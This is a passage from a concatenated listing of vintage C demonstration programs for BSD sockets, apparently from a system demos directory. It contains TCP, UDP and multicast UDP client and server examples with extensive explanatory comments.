	 * of INADDR_ANY will be used so we do not have to
	 * look up the internet address of the local host.
	 */
	myaddr.sin_family = AF_INET;
	myaddr.sin_port = 0;
	myaddr.sin_addr.s_addr = INADDR_ANY;
	if (bind(s, &myaddr, sizeof(myaddr)) == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to bind socket\n", argv[0]);
		exit(1);
	}

	/* 
	 * Send the request to the nameserver. 
	 */
	gettimeofday(&oldt, (struct timezone*)0);
again:
	x = sendto(s, argv[3], strlen(argv[3]), 0,
                   (struct sockaddr*)&mcastaddr, sizeof(mcastaddr));
	if (x == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to send request\n", argv[0]);
		exit(1);
	}

	/* 
	 * Set up a timeout so I don't hang in case the packet
	 * gets lost.  After all, UDP does not guarantee delivery.
	 */
	signal(SIGALRM, handler);
	setalarm(TIMEOUT);
	/* 
	 * Wait for the reply to come in.
	 */
        addrlen = sizeof(servaddr);
	x = recvfrom(s, &reqaddr, sizeof(reqaddr), 0,
                     (struct sockaddr*)&servaddr, &addrlen);
	if (x == -1) {
		if (errno == EINTR) {
		/* 
		 * Alarm went off and aborted the receive.
		 * Need to retry the request if we have
		 * not already exceeded the retry limit.
		 */
			if (--retry) {
				goto again;
			} else {
	                        gettimeofday(&t, (struct timezone*)0);
                                deltatime(&delta, &t, &oldt);
				printf("No response from nameserver at %s\n",
				       argv[1]);
				printf("after %d attempts "
				       "in %d.%06d seconds.\n",
				       retry0, delta.tv_sec, delta.tv_usec);
				exit(1);
			}
		} else {
			perror(argv[0]);
			fprintf(stderr, "%s: unable to receive response\n",
			        argv[0]);
			exit(1);
		}
	}
	setalarm(0);
	/* 
	 * Print out response. 
	 */
	gettimeofday(&t, (struct timezone*)0);
        deltatime(&delta, &t, &oldt);
        printf("Reported by nameserver at %s in %d.%06d seconds.\n",
               inet_ntoa(servaddr.sin_addr), delta.tv_sec, delta.tv_usec);
	if (reqaddr.s_addr == ADDRNOTFOUND) {
		printf("%s address is unknown.\n", argv[3]);
		exit(1);
	} else {
		printf("%s address is %s.\n", argv[3], inet_ntoa(reqaddr));
	}
}


setalarm(msec)
   int msec;
{
   int sec = 0;
   struct itimerval it;

   if (msec < 0)
      msec = 0;
   else if (msec >= 1000)
      sec = msec/1000, msec %= 1000;

   /* disable timer after it pops */
   it.it_interval.tv_sec = it.it_interval.tv_usec = 0;

   /* set timer value */
   it.it_value.tv_sec = sec;
   it.it_value.tv_usec = msec*1000;
   setitimer(ITIMER_REAL, &it, (struct itimerval*)0);
}


deltatime(delta, t, oldt)
   struct timeval *delta, *t, *oldt;
{
   delta->tv_sec = t->tv_sec - oldt->tv_sec;
   delta->tv_usec = t->tv_usec - oldt->tv_usec;
   if (delta->tv_usec < 0)
      delta->tv_sec--, delta->tv_usec += 1000000;
}
::::::::::::::
./usr/lib/demos/networking/socket/client.tcp.c
::::::::::::::
/*
 *			C L I E N T . T C P
 *
 *	This is an example program that demonstrates the use of
 *	stream sockets as an IPC mechanism.  This contains the client,
 *	and is intended to operate in conjunction with the server
 *	program found in serv.tcp.  Together, these two programs
 *	demonstrate many of the features of sockets, as well as good
 *	conventions for using these features.
 *
 *	This program requests a service called "example".  In order for
 *	it to function, an entry for it needs to exist in the
 *	/etc/services file.  The port address for this service can be
 *	any port number that is likely to be unused, such as 22375,
 *	for example.  The host on which the server will be running
 *	must also have the same entry (same port number) in its
 *	/etc/services file.
 *
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <netdb.h>

int s;				/* connected socket descriptor */

struct hostent *hp;		/* pointer to host info for remote host */
struct servent *sp;		/* pointer to service information */

long timevar;			/* contains time returned by time() */
char *ctime();			/* declare time formatting routine */

struct sockaddr_in myaddr_in;	/* for local socket address */
struct sockaddr_in peeraddr_in;	/* for peer socket address */

/*
 *			M A I N
 *
 *	This routine is the client which request service from the remote
 *	"example server".  It creates a connection, sends a number of
 *	requests, shuts down the connection in one direction to signal the
 *	server about the end of data, and then receives all of the responses.
 *	Status will be written to stdout.
 *
 *	The name of the system to which the requests will be sent is given
 *	as a parameter to the command.
 */
main(argc, argv)
int argc;
char *argv[];
{
	int addrlen, i, j;

		/* This example uses 10 byte messages. */
	char buf[10];

	if (argc != 2) {
		fprintf(stderr, "Usage:  %s <remote host>\n", argv[0]);
		exit(1);
	}

		/* clear out address structures */
	memset ((char *)&myaddr_in, 0, sizeof(struct sockaddr_in));
	memset ((char *)&peeraddr_in, 0, sizeof(struct sockaddr_in));

		/* Set up the peer address to which we will connect. */
	peeraddr_in.sin_family = AF_INET;
		/* Get the host information for the hostname that the
		 * user passed in.
		 */
	hp = gethostbyname (argv[1]);
	if (hp == NULL) {
		fprintf(stderr, "%s: %s not found in /etc/hosts\n",
				argv[0], argv[1]);
		exit(1);
	}
	peeraddr_in.sin_addr.s_addr = ((struct in_addr *)(hp->h_addr))->s_addr;
		/* Find the information for the "example" server
		 * in order to get the needed port number.
		 */
	sp = getservbyname ("example", "tcp");
	if (sp == NULL) {
		fprintf(stderr, "%s: example not found in /etc/services\n",
				argv[0]);
		exit(1);
	}
	peeraddr_in.sin_port = sp->s_port;

		/* Create the socket. */
	s = socket (AF_INET, SOCK_STREAM, 0);
	if (s == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to create socket\n", argv[0]);
		exit(1);
	}
		/* Try to connect to the remote server at the address
		 * which was just built into peeraddr.
		 */
	if (connect(s, &peeraddr_in, sizeof(struct sockaddr_in)) == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to connect to remote\n", argv[0]);
		exit(1);
	}
		/* Since the connect call assigns a random address
		 * to the local end of this connection, let's use
		 * getsockname to see what it assigned.  Note that
		 * addrlen needs to be passed in as a pointer,
		 * because getsockname returns the actual length
		 * of the address.
		 */
	addrlen = sizeof(struct sockaddr_in);
	if (getsockname(s, &myaddr_in, &addrlen) == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to read socket address\n", argv[0]);
		exit(1);
	}

		/* Print out a startup message for the user. */
	time(&timevar);
		/* The port number must be converted first to host byte
		 * order before printing.  On most hosts, this is not
		 * necessary, but the ntohs() call is included here so
		 * that this program could easily be ported to a host
		 * that does require it.
		 */
	printf("Connected to %s on port %u at %s",
			argv[1], ntohs(myaddr_in.sin_port), ctime(&timevar));


		/* This sleep simulates any preliminary processing
		 * that a real client might do here.
		 */
	sleep(5);

		/* Sent out all the requests to the remote server.
		 * In this case, five are sent, but any random number
		 * could be used.  Note that the first four bytes of
		 * buf are set up to contain the request number.  This
		 * number will be returned unmodified in the reply from
		 * the server.
		 */
			/* CAUTION:
			 * If you increase the number of requests sent,
			 * or the size of the requests, you should be
			 * aware that you could encounter a deadlock
			 * situation.  Both the client's and server's
			 * sockets can only queue a limited amount of
			 * data on their receive queues.
			 */
	for (i=1; i<=5; i++) {
		*buf = i;
		if (send(s, buf, 10, 0) != 10) {
			fprintf(stderr, "%s: Connection aborted on error ",
					argv[0]);
			fprintf(stderr, "on send number %d\n", i);
			exit(1);
		}
	}

		/* Now, shutdown the connection for further sends.
		 * This will cause the server to receive an end-of-file
		 * condition after it has received all the requests that
		 * have just been sent, indicating that we will not be
		 * sending any further requests.
		 */
	if (shutdown(s, 1) == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to shutdown socket\n", argv[0]);
		exit(1);
	}

		/* Now, start receiving all of the replys from the server.
		 * This loop will terminate when the recv returns zero,
		 * which is an end-of-file condition.  This will happen
		 * after the server has sent all of its replies, and closed
		 * its end of the connection.
		 */
	while (i = recv(s, buf, 10, 0)) {
		if (i == -1) {
errout:			perror(argv[0]);
			fprintf(stderr, "%s: error reading result\n", argv[0]);
			exit(1);
		}
			/* The reason this while loop exists is that there
			 * is a remote possibility of the above recv returning
			 * less than 10 bytes.  This is because a recv returns
			 * as soon as there is some data, and will not wait for
			 * all of the requested data to arrive.  Since 10 bytes
			 * is relatively small compared to the allowed TCP
			 * packet sizes, a partial receive is unlikely.  If
			 * this example had used 2048 bytes requests instead,
			 * a partial receive would be far more likely.
			 * This loop will keep receiving until all 10 bytes
			 * have been received, thus guaranteeing that the
			 * next recv at the top of the loop will start at
			 * the begining of the next reply.
			 */
		while (i < 10) {
			j = recv(s, &buf[i], 10-i, 0);
			if (j == -1) goto errout;
			i += j;
		}
			/* Print out message indicating the identity of
			 * this reply.
			 */
		printf("Received result number %d\n", *buf);
	}

		/* Print message indicating completion of task. */
	time(&timevar);
	printf("All done at %s", ctime(&timevar));
}
::::::::::::::
./usr/lib/demos/networking/socket/client.udp.c
::::::::::::::
/*
 *			C L I E N T . U D P
 *
 *	This is an example program that demonstrates the use of
 *	datagram sockets as an IPC mechanism.  This contains the client,
 *	and is intended to operate in conjunction with the server
 *	program found in serv.udp.  Together, these two programs
 *	demonstrate many of the features of sockets, as well as good
 *	conventions for using these features.
 *
 *	This program requests a service called "example".  In order for
 *	it to function, an entry for it needs to exist in the
 *	/etc/services file.  The port address for this service can be
 *	any port number that is likely to be unused, such as 22375,
 *	for example.  The host on which the server will be running
 *	must also have the same entry (same port number) in its
 *	/etc/services file.
 *
 *	The "example" service is an example of a simple name server
 *	application.  The host that is to provide this service is
 *	required to be in the /etc/hosts file.  Also, the host
 *	providing this service presumably knows the internet addresses
 *	of many hosts which the local host does not.  Therefore,
 *	this program will request the internet address of a target
 *	host by name from the serving host.  The serving host
 *	will return the requested internet address as a response,
 *	and will return an address of all ones if it does not recognize
 *	the host name.
 *
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/errno.h>
#include <netinet/in.h>
#include <stdio.h>
#include <signal.h>
#include <netdb.h>

extern int errno;

int s;				/* socket descriptor */

struct hostent *hp;		/* pointer to host info for nameserver host */
struct servent *sp;		/* pointer to service information */

struct sockaddr_in myaddr_in;	/* for local socket address */
struct sockaddr_in servaddr_in;	/* for server socket address */
struct in_addr reqaddr;		/* for returned internet address */

#define ADDRNOTFOUND	0xffffffff	/* value returned for unknown host */
#define RETRIES	5		/* number of times to retry before givin up */

/*
 *			H A N D L E R
 *
 *	This routine is the signal handler for the alarm signal.
 *	It simply re-installs itself as the handler and returns.
 */
handler()
{
	signal(SIGALRM, handler);
}

/*
 *			M A I N
 *
 *	This routine is the client which requests service from the remote
 *	"example server".  It will send a message to the remote nameserver
 *	requesting the internet address corresponding to a given hostname.
 *	The server will look up the name, and return its internet address.
 *	The returned address will be written to stdout.
 *
 *	The name of the system to which the requests will be sent is given
 *	as the first parameter to the command.  The second parameter should
 *	be the the name of the target host for which the internet address
 *	is sought.
 */
main(argc, argv)
int argc;
char *argv[];
{
	int i;
	int retry = RETRIES;		/* holds the retry count */
	char *inet_ntoa();

	if (argc != 3) {
		fprintf(stderr, "Usage:  %s <nameserver> <target>\n", argv[0]);
		exit(1);
	}

		/* clear out address structures */
	memset ((char *)&myaddr_in, 0, sizeof(struct sockaddr_in));
	memset ((char *)&servaddr_in, 0, sizeof(struct sockaddr_in));

		/* Set up the server address. */
	servaddr_in.sin_family = AF_INET;
		/* Get the host information for the server's hostname that the
		 * user passed in.
		 */
	hp = gethostbyname (argv[1]);
	if (hp == NULL) {
		fprintf(stderr, "%s: %s not found in /etc/hosts\n",
				argv[0], argv[1]);
		exit(1);
	}
	servaddr_in.sin_addr.s_addr = ((struct in_addr *)(hp->h_addr))->s_addr;
		/* Find the information for the "example" server
		 * in order to get the needed port number.
		 */
	sp = getservbyname ("example", "udp");
	if (sp == NULL) {
		fprintf(stderr, "%s: example not found in /etc/services\n",
				argv[0]);
		exit(1);
	}
	servaddr_in.sin_port = sp->s_port;

		/* Create the socket. */
	s = socket (AF_INET, SOCK_DGRAM, 0);
	if (s == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to create socket\n", argv[0]);
		exit(1);
	}
		/* Bind socket to some local address so that the
		 * server can send the reply back.  A port number
		 * of zero will be used so that the system will
		 * assign any available port number.  An address
		 * of INADDR_ANY will be used so we do not have to
		 * look up the internet address of the local host.
		 */
	myaddr_in.sin_family = AF_INET;
	myaddr_in.sin_port = 0;
	myaddr_in.sin_addr.s_addr = INADDR_ANY;
	if (bind(s, &myaddr_in, sizeof(struct sockaddr_in)) == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to bind socket\n", argv[0]);
		exit(1);
	}
		/* Set up alarm signal handler. */
	signal(SIGALRM, handler);
		/* Send the request to the nameserver. */
again:	if (sendto (s, argv[2], strlen(argv[2]), 0, &servaddr_in,
				sizeof(struct sockaddr_in)) == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to send request\n", argv[0]);
		exit(1);
	}
		/* Set up a timeout so I don't hang in case the packet
		 * gets lost.  After all, UDP does not guarantee
		 * delivery.
		 */
	alarm(5);
		/* Wait for the reply to come in.  We assume that
		 * no messages will come from any other source,
		 * so that we do not need to do a recvfrom nor
		 * check the responder's address.
		 */
	if (recv (s, &reqaddr, sizeof(struct in_addr), 0) == -1) {
		if (errno == EINTR) {
				/* Alarm went off and aborted the receive.
				 * Need to retry the request if we have
				 * not already exceeded the retry limit.
				 */
			if (--retry) {
				goto again;
			} else {
				printf("Unable to get response from");
				printf(" %s after %d attempts.\n",
						argv[1], RETRIES);
				exit(1);
			}
		} else {
			perror(argv[0]);
			fprintf(stderr, "%s: unable to receive response\n",
								argv[0]);
			exit(1);
		}
	}
	alarm(0);
		/* Print out response. */
	if (reqaddr.s_addr == ADDRNOTFOUND) {
		printf("Host %s unknown by nameserver %s.\n", argv[2],
								argv[1]);
		exit(1);
	} else {
		printf("Address for %s is %s.\n", argv[2],
			inet_ntoa(reqaddr));
	}
}
::::::::::::::
./usr/lib/demos/networking/socket/serv.mcast.c
::::::::::::::
/*
 *          	S E R V . U D P . M U L T I C A S T
 *
 *	This is an example program that demonstrates the use of
 *	datagram sockets using IP Multicast as an IPC mechanism.  This 
 * 	contains the server, and is intended to operate in conjunction 
 *	with the client program found in client.udp.multicast.  Together, 
 * 	these two programs demonstrate many of the features of sockets, as 
 *	well as good conventions for using these features.
 *
 *	This program provides a service called "example".  It is an
 *	example of a simple multicast name server.  In order for
 *	it to function, an entry for it needs to exist in the
 *	/etc/services file.  The port address for this service can be
 *	any port number that is likely to be unused, such as 22375,
 *	for example.  The host on which the client will be running
 *	must also have the same entry (same port number) in its
 *	/etc/services file.
 *
 */

/*
 * Compile options:
 *    -DDEBUG     Do not fork child daemon so that we can use debugger
 *    -DVERBOSE   Write response information to stdout
 */

#ifndef lint
static char __revid[] = "@(#) mcastserver.c $Revision: 1.2.116.1 $ $Date: 95/10/17 15:39:00 $";
#endif

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <netdb.h>

#ifdef DEBUG
#define fork() 0		/* always execute child code if -DDEBUG */
#endif

int s;				/* socket descriptor */

#define BUFFERSIZE	1024	/* maximum size of packets to be received */
int cc;				/* contains the number of bytes read */
char buffer[BUFFERSIZE];	/* buffer for packets to be read into */

struct hostent *hp;		/* pointer to host info for requested host */
struct servent *sp;		/* pointer to service information */

struct sockaddr_in myaddr_in;	/* for local socket address */
struct sockaddr_in clientaddr_in;	/* for client's socket address */
struct in_addr reqaddr;		/* for requested host's address */
struct ip_mreq mreq;            /* to join the multicast group */

#define ADDRNOTFOUND	0xffffffff	/* return address for unfound host */

char *inet_ntoa();

/*
 *			M A I N
 *
 *	This routine starts the server.  It forks, leaving the child
 *	to do all the work, so it does not have to be run in the
 *	background.  It sets up the socket, and for each incoming
 *	request, it returns an answer.  Each request consists of a
 *	host name for which the requester desires to know the
 *	internet address.  The server will look up the name in its
 *	/etc/hosts file, and return the internet address to the
 *	client.  An internet address value of all ones will be returned
 *	if the host name is not found.
 *
 */
main(argc, argv)
int argc;
char *argv[];
{
	int addrlen;

        if (argc != 3) {
           fprintf(stderr, "Usage:    %s server_mcast_ipaddr "
                   "interface_ipaddr\n", argv[0]);
           fprintf(stderr, "Normally: %s server_mcast_ipaddr 0.0.0.0\n",
                   argv[0]);
                exit(1);
        }

	/* 
	 * clear out address structures 
	 */
	memset ((char *)&myaddr_in, 0, sizeof(struct sockaddr_in));
	memset ((char *)&clientaddr_in, 0, sizeof(struct sockaddr_in));

	/* 
	 * Set up address structure for the socket. 
	 */
	myaddr_in.sin_family = AF_INET;
	/* The server should receive on the wildcard address,
	 * rather than its own internet address.  This is
	 * generally good practice for servers, because on
	 * systems which are connected to more than one
	 * network at once will be able to have one server
	 * listening on all networks at once.  Even when the
	 * host is connected to only one network, this is good
	 * practice, because it makes the server program more
	 * portable.
	 */
	myaddr_in.sin_addr.s_addr = INADDR_ANY;
	/* Find the information for the "example" server
	 * in order to get the needed port number.
	 */
	sp = getservbyname ("example", "udp");
	if (sp == NULL) {
		printf("%s: \"example\" not found in /etc/services."
		       "  Add the line:\n", argv[0]);
		printf("   \"example  nnnnn/udp\", where \"nnnnn\" is a "
		       "unique port number\n");
		exit(1);
	}
	myaddr_in.sin_port = sp->s_port;

	/* 
	 * Create the socket. 
	 */
	s = socket (AF_INET, SOCK_DGRAM, 0);
	if (s == -1) {
		perror(argv[0]);
		printf("%s: unable to create socket\n", argv[0]);
		exit(1);
	}

	/*
	 * Now have this server join a IP Multicast group
	 */
        if((mreq.imr_multiaddr.s_addr = inet_addr(argv[1])) == -1) {
                perror(argv[0]);
                printf("%s: Invalid format for address %s\n", 
			argv[0], argv[1]);
		exit (1);
        }

	/* 
	 * Normally, specify "0.0.0.0" for argv[2] to allow the kernel
	 * to select an appropriate interface based on route configuration.
	 */
        if ((mreq.imr_interface.s_addr = inet_addr(argv[2])) == -1) {
                perror(argv[0]);
                printf("%s: Invalid format for address %s\n", 
			argv[0], argv[2]);
                printf("%s: Allowing system to select default interface instead of %s\n",
                        argv[0], argv[2]);
                mreq.imr_interface.s_addr = INADDR_ANY;
        }

	/*
	 * One may also specify a specific interface using either the IP
	 * address in dot notation format, or the nodename which maps to 
	 * the desired IP address.
	 * Example code follows:
	 * {
	 *   host = gethostbyname("NODENAME");
         *   bcopy(host->h_addr, &mreq.imr_interface.s_addr, host->h_length);
	 * }
	 */
	
	/* 
	 * Join the multicast group
	 */ 
	if (setsockopt(s, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mreq,
		sizeof(struct ip_mreq) ) == -1 ) {
		perror(argv[0]);
		printf("%s: unable to join multicast group\n", argv[0]);
		exit (1);
	}

	/*
	 * Bind the server's address to the socket. 
	 */
	if (bind(s, &myaddr_in, sizeof(struct sockaddr_in)) == -1) {
		perror(argv[0]);
		printf("%s: unable to bind address\n", argv[0]);
		exit(1);
	}

	/* Now, all the initialization of the server is
	 * complete, and any user errors will have already
	 * been detected.  Now we can fork the daemon and
	 * return to the user.  We need to do a setpgrp
	 * so that the daemon will no longer be associated
	 * with the user's control terminal.  This is done
	 * before the fork, so that the child will not be
	 * a process group leader.  Otherwise, if the child
	 * were to open a terminal, it would become associated
	 * with that terminal as its control terminal.  It is
	 * always best for the parent to do the setpgrp.
	 */
	setpgrp();

	switch (fork()) {
	case -1:		/* Unable to fork, for some reason. */
		perror(argv[0]);
		printf("%s: unable to fork daemon\n", argv[0]);
		exit(1);

	case 0:	/* 
		 * The child process (daemon) comes here.
		 * Close stdin, stdout, and stderr so that they will
		 * not be kept open.  From now on, the daemon will
		 * not report any error messages.  This daemon
		 * will loop forever, waiting for requests and
		 * responding to them.
		 */
		close(stdin);
		close(stderr);
#ifndef VERBOSE
		close(stdout);
#endif
		/* 
		 * This will open the /etc/hosts file and keep
		 * it open.  This will make accesses to it faster.
		 */
		sethostent(1);
		for(;;) {
			/* 
			 * Note that addrlen is passed as a pointer
			 * so that the recvfrom call can return the
			 * size of the returned address.
			 */
			addrlen = sizeof(struct sockaddr_in);
			/* 
			 * This call will block until a new
			 * request arrives.  Then, it will
			 * return the address of the client,
			 * and a buffer containing its request.
			 * BUFFERSIZE - 1 bytes are read so that
			 * room is left at the end of the buffer
			 * for a null character.
			 */
			cc = recvfrom(s, buffer, BUFFERSIZE - 1, 0,
						&clientaddr_in, &addrlen);
			if ( cc == -1) exit(1);
			/* 
			 * Make sure the message received is
			 * null terminated.
			 */
			buffer[cc]='\0';
			/* 
			 * Treat the message as a string containing
			 * a hostname.  Search for the name in
			 * /etc/hosts.
			 */
			hp = gethostbyname (buffer);
			if (hp == NULL) {
				/* 
				 * Name was not found.  Return a
				 * special value signifying the
				 * error.
				 */
				reqaddr.s_addr = ADDRNOTFOUND;
			} else {
				/* 
				 * Copy address of host into the
				 * return buffer.
				 */
				reqaddr.s_addr =
				       ((struct in_addr *)(hp->h_addr))->s_addr;
			}
			/* 
			 * Send the response back to the
			 * requesting client.  The address
			 * is sent in network byte order. Note that
			 * all errors are ignored.  The client
			 * will retry if it does not receive
			 * the response.
			 */
			sendto (s, &reqaddr, sizeof(struct in_addr),
					0, &clientaddr_in, addrlen);
#ifdef VERBOSE
			{
			char reqstr[16], clistr[16];
       			strcpy(reqstr, inet_ntoa(reqaddr.s_addr));
       			strcpy(clistr,
			       inet_ntoa(clientaddr_in.sin_addr.s_addr));
			printf("%s %d: send %s for %s to %s.%d\n",
			       argv[0], getpid(), reqstr, buffer, clistr,
       			       clientaddr_in.sin_port);
			}
#endif
		}

	default:		/* Parent process comes here. */
		exit(0);
	}
}
::::::::::::::
./usr/lib/demos/networking/socket/serv.tcp.c
::::::::::::::
/*
 *          		S E R V . T C P
 *
 *	This is an example program that demonstrates the use of
 *	stream sockets as an IPC mechanism.  This contains the server,
 *	and is intended to operate in conjunction with the client
 *	program found in client.tcp.  Together, these two programs
 *	demonstrate many of the features of sockets, as well as good
 *	conventions for using these features.
 *
 *	This program provides a service called "example".  In order for
 *	it to function, an entry for it needs to exist in the
 *	/etc/services file.  The port address for this service can be
 *	any port number that is likely to be unused, such as 22375,
 *	for example.  The host on which the client will be running
 *	must also have the same entry (same port number) in its
 *	/etc/services file.
 *
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <netdb.h>

int s;				/* connected socket descriptor */
int ls;				/* listen socket descriptor */

struct hostent *hp;		/* pointer to host info for remote host */
struct servent *sp;		/* pointer to service information */

long timevar;			/* contains time returned by time() */
char *ctime();			/* declare time formatting routine */

struct linger linger;		/* allow a lingering, graceful close; */
				/* used when setting SO_LINGER */

struct sockaddr_in myaddr_in;	/* for local socket address */
struct sockaddr_in peeraddr_in;	/* for peer socket address */

/*
 *			M A I N
 *
 *	This routine starts the server.  It forks, leaving the child
 *	to do all the work, so it does not have to be run in the
 *	background.  It sets up the listen socket, and for each incoming
 *	connection, it forks a child process to process the data.  It
 *	will loop forever, until killed by a signal.
 *
 */
main(argc, argv)
int argc;
char *argv[];
{
	int addrlen;

		/* clear out address structures */
	memset ((char *)&myaddr_in, 0, sizeof(struct sockaddr_in));
	memset ((char *)&peeraddr_in, 0, sizeof(struct sockaddr_in));

		/* Set up address structure for the listen socket. */
	myaddr_in.sin_family = AF_INET;
		/* The server should listen on the wildcard address,
		 * rather than its own internet address.  This is
		 * generally good practice for servers, because on
		 * systems which are connected to more than one
		 * network at once will be able to have one server
		 * listening on all networks at once.  Even when the
		 * host is connected to only one network, this is good
		 * practice, because it makes the server program more
		 * portable.
		 */
	myaddr_in.sin_addr.s_addr = INADDR_ANY;
		/* Find the information for the "example" server
		 * in order to get the needed port number.
		 */
	sp = getservbyname ("example", "tcp");
	if (sp == NULL) {
		fprintf(stderr, "%s: example not found in /etc/services\n",
				argv[0]);
		exit(1);
	}
	myaddr_in.sin_port = sp->s_port;

		/* Create the listen socket. */
	ls = socket (AF_INET, SOCK_STREAM, 0);
	if (ls == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to create socket\n", argv[0]);
		exit(1);
	}
		/* Bind the listen address to the socket. */
	if (bind(ls, &myaddr_in, sizeof(struct sockaddr_in)) == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to bind address\n", argv[0]);
		exit(1);
	}
		/* Initiate the listen on the socket so remote users
		 * can connect.  The listen backlog is set to 5, which
		 * is within the supported range of 1 to 20.
		 */
	if (listen(ls, 5) == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to listen on socket\n", argv[0]);
		exit(1);
	}

		/* Now, all the initialization of the server is
		 * complete, and any user errors will have already
		 * been detected.  Now we can fork the daemon and
		 * return to the user.  We need to do a setpgrp
		 * so that the daemon will no longer be associated
		 * with the user's control terminal.  This is done
		 * before the fork, so that the child will not be
		 * a process group leader.  Otherwise, if the child
		 * were to open a terminal, it would become associated
		 * with that terminal as its control terminal.  It is
		 * always best for the parent to do the setpgrp.
		 */
	setpgrp();

	switch (fork()) {
	case -1:		/* Unable to fork, for some reason. */
		perror(argv[0]);
		fprintf(stderr, "%s: unable to fork daemon\n", argv[0]);
		exit(1);

	case 0:			/* The child process (daemon) comes here. */
			/* Close stdin and stderr so that they will not
			 * be kept open.  Stdout is assumed to have been
			 * redirected to some logging file, or /dev/null.
			 * From now on, the daemon will not report any
			 * error messages.  This daemon will loop forever,
			 * waiting for connections and forking a child
			 * server to handle each one.
			 */
		fclose(stdin);
		fclose(stderr);
			/* Set SIGCLD to SIG_IGN, in order to prevent
			 * the accumulation of zombies as each child
			 * terminates.  This means the daemon does not
			 * have to make wait calls to clean them up.
			 */
		signal(SIGCLD, SIG_IGN);
		for(;;) {
				/* Note that addrlen is passed as a pointer
				 * so that the accept call can return the
				 * size of the returned address.
				 */
			addrlen = sizeof(struct sockaddr_in);
				/* This call will block until a new
				 * connection arrives.  Then, it will
				 * return the address of the connecting
				 * peer, and a new socket descriptor, s,
				 * for that connection.
				 */
			s = accept(ls, &peeraddr_in, &addrlen);
			if ( s == -1) exit(1);
			switch (fork()) {
			case -1:	/* Can't fork, just exit. */
				exit(1);
			case 0:		/* Child process comes here. */
				server();
				exit(0);
			default:	/* Daemon process comes here. */
					/* The daemon needs to remember
					 * to close the new accept socket
					 * after forking the child.  This
					 * prevents the daemon from running
					 * out of file descriptor space.  It
					 * also means that when the server
					 * closes the socket, that it will
					 * allow the socket to be destroyed
					 * since it will be the last close.
					 */
				close(s);
			}

		}

	default:		/* Parent process comes here. */
		exit(0);
	}
}

/*
 *				S E R V E R
 *
 *	This is the actual server routine that the daemon forks to
 *	handle each individual connection.  Its purpose is to receive
 *	the request packets from the remote client, process them,
 *	and return the results to the client.  It will also write some
 *	logging information to stdout.
 *
 */
server()
{
	int reqcnt = 0;		/* keeps count of number of requests */
	char buf[10];		/* This example uses 10 byte messages. */
	char *inet_ntoa();
	char *hostname;		/* points to the remote host's name string */
	int len, len1;

		/* Close the listen socket inherited from the daemon. */
	close(ls);

		/* Look up the host information for the remote host
		 * that we have connected with.  Its internet address
		 * was returned by the accept call, in the main
		 * daemon loop above.
		 */
	hp = gethostbyaddr ((char *) &peeraddr_in.sin_addr,
				sizeof (struct in_addr),
				peeraddr_in.sin_family);

	if (hp == NULL) {
			/* The information is unavailable for the remote
			 * host.  Just format its internet address to be
			 * printed out in the logging information.  The
			 * address will be shown in "internet dot format".
			 */
		hostname = inet_ntoa(peeraddr_in.sin_addr);
	} else {
		hostname = hp->h_name;	/* point to host's name */
	}
		/* Log a startup message. */
	time (&timevar);
		/* The port number must be converted first to host byte
		 * order before printing.  On most hosts, this is not
		 * necessary, but the ntohs() call is included here so
		 * that this program could easily be ported to a host
		 * that does require it.
		 */
	printf("Startup from %s port %u at %s",
		hostname, ntohs(peeraddr_in.sin_port), ctime(&timevar));

		/* Set the socket for a lingering, graceful close.
		 * This will cause a final close of this socket to wait until all of the
		 * data sent on it has been received by the remote host.
		 */
	linger.l_onoff  =1;
	linger.l_linger =1;
	if (setsockopt(s, SOL_SOCKET, SO_LINGER, &linger,
					sizeof(linger)) == -1) {
errout:		printf("Connection with %s aborted on error\n", hostname);
		exit(1);
	}

		/* Go into a loop, receiving requests from the remote
		 * client.  After the client has sent the last request,
		 * it will do a shutdown for sending, which will cause
		 * an end-of-file condition to appear on this end of the
		 * connection.  After all of the client's requests have
		 * been received, the next recv call will return zero
		 * bytes, signalling an end-of-file condition.  This is
		 * how the server will know that no more requests will
		 * follow, and the loop will be exited.
		 */
	while (len = recv(s, buf, 10, 0)) {
		if (len == -1) goto errout; /* error from recv */
			/* The reason this while loop exists is that there
			 * is a remote possibility of the above recv returning
			 * less than 10 bytes.  This is because a recv returns
			 * as soon as there is some data, and will not wait for
			 * all of the requested data to arrive.  Since 10 bytes
			 * is relatively small compared to the allowed TCP
			 * packet sizes, a partial receive is unlikely.  If
			 * this example had used 2048 bytes requests instead,
			 * a partial receive would be far more likely.
			 * This loop will keep receiving until all 10 bytes
			 * have been received, thus guaranteeing that the
			 * next recv at the top of the loop will start at
			 * the begining of the next request.
			 */
		while (len < 10) {
			len1 = recv(s, &buf[len], 10-len, 0);
			if (len1 == -1) goto errout;
			len += len1;
		}
			/* Increment the request count. */
		reqcnt++;
			/* This sleep simulates the processing of the
			 * request that a real server might do.
			 */
		sleep(1);
			/* Send a response back to the client. */
		if (send(s, buf, 10, 0) != 10) goto errout;
	}

		/* The loop has terminated, because there are no
		 * more requests to be serviced.  As mentioned above,
		 * this close will block until all of the sent replies
		 * have been received by the remote host.  The reason
		 * for lingering on the close is so that the server will
		 * have a better idea of when the remote has picked up
		 * all of the data.  This will allow the start and finish
		 * times printed in the log file to reflect more accurately
		 * the length of time this connection was used.
		 */
	close(s);

		/* Log a finishing message. */
	time (&timevar);
		/* The port number must be converted first to host byte
		 * order before printing.  On most hosts, this is not
		 * necessary, but the ntohs() call is included here so
		 * that this program could easily be ported to a host
		 * that does require it.
		 */
	printf("Completed %s port %u, %d requests, at %s\n",
